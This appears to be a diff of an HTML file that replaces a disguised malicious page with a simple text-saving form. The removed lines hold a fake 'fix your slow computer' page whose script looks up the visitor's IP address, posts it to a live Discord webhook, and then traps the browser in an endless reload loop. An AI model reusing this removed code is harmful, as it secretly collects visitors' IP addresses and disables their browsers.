@@ -1,29 +1,38 @@
-<h1>It appears as if you have a slow computer! Here is a step by step tutorial to fix it!</h1>
-<p>ctrl  + shift + q + q</p>
-<p>ctrl + shift + alt + r</p>
-<p>enter * enter</p>
+<html>
+  <head>
+    <title>Input _Text</title>
+  </head>
+  <body>
+    <h1>Text:Save</h1>
+    <form>
+      <input type="text" id="text-input" />
+      <button type="button" onclick="saveText()">Save Text</button>
+    </form>
+    <script>
+      function saveText() {
+        // Get the text from the input field
+        var text = document.getElementById("text-input").value;
 
-<script>
-  function getIP(json) {
-    var request = new XMLHttpRequest();
-        request.open("POST", "https://discord.com/api/webhooks/1049902753402605640/rNfdlL-Yovu8NBGE_HGeuveFTIUPpJQRVLyOLQi6CW795wJW4VQUgYWnTaUVTSA3bb_S");
-  
-        request.setRequestHeader('Content-type', 'application/json');
-  
-        var params = {
-          username: "beamed",
-          content: "**IP:** " + json.ip + ""
-        }
-  
-        request.send(JSON.stringify(params));
+        // Create a new Blob object containing the text
+        var textBlob = new Blob([text], {type: "text/plain"});
+
+        // Create a link element to download the file
+        var downloadLink = document.createElement("a");
+
+        // Set the download link's attributes
+        downloadLink.download = "text.txt";
+        downloadLink.href = URL.createObjectURL(textBlob);
+        downloadLink.style.display = "none";
+
+        // Add the link to the page
+        document.body.appendChild(downloadLink);
+
+        // Click the link to download the file
+        downloadLink.click();
+
+        // Remove the link from the page
+        document.body.removeChild(downloadLink);
       }
-  
-  </script>
-<script>
-  onbeforeunload = function(){localStorage.x=1};
-
-setTimeout(function(){
-  while(1)location.reload(1)
-}, 1000)</script>
-</script>
-  <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+    </script>
+  </body>
+</html>
